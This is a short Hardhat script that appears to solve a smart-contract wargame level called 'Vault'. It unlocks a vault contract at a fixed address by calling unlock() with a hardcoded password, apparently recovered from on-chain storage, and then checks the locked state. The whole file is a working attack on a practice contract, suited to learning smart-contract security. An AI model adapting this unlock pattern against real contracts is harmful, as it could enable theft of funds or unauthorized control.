const hre = require("hardhat");
require("dotenv").config();

async function main() {
    // Setup accounts
    const [attacker] = await hre.ethers.getSigners();
    const PASSWORD = hre.ethers.utils.hexlify(ethers.utils.toUtf8Bytes("A very strong secret password :)"));
    const INSTANCE_ADDRESS = "0x2382785BD287836E4Bd563A9BAA600EEC31aD856";

    // Fetch instance contract
    const vault = await hre.ethers.getContractAt("Vault", INSTANCE_ADDRESS);

    console.log(`Vault contract fetched at ${vault.address}\n`);

    // Attack...
    const transaction = await vault.connect(attacker).unlock(PASSWORD);
    await transaction.wait();

    const isLocked = await vault.locked();

    if (isLocked) {
        console.log(`Contract locked...\n`);
    } else {
        console.log(`Contract unlocked...\n`);
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});